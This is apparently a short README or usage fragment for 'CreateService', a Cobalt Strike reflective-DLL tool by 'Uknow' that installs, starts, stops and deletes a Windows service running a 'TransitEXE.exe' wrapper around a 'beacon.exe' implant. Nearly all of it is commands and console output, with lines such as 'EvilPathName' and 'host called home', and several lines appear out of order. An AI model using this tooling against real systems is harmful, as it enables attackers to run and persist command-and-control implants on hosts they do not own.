
    [+] EvilPathName: C:\Users\Administrator\Desktop\beacon.exe
    [+] EvilPathName: C:\Users\Administrator\Desktop\test.exe
    [+] ServiceName: test
    [+] Success! Service successfully Create and Start.
    [+] Success! Service successfully Stop and Delete.
    [+] TransitPathName: C:\Users\Administrator\Desktop\TransitEXE.exe
# CreateService
## Cobalt Strike RDI
C:\Users\Administrator\Desktop>CreateService.exe "C:\Users\Administrator\Desktop\TransitEXE.exe" "C:\Users\Administrator\Desktop\test.exe" test start
[*] CreateService by Uknow
[*] Tasked beacon to spawn CreateService ....
[+] arguments are:C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test start
[+] arguments are:C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test stop
[+] host called home, sent: 103052 bytes
[+] host called home, sent: 103053 bytes
[+] received output:
```
beacon> CreateService C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test start
beacon> CreateService C:\Users\Administrator\Desktop\TransitEXE.exe C:\Users\Administrator\Desktop\beacon.exe test stop
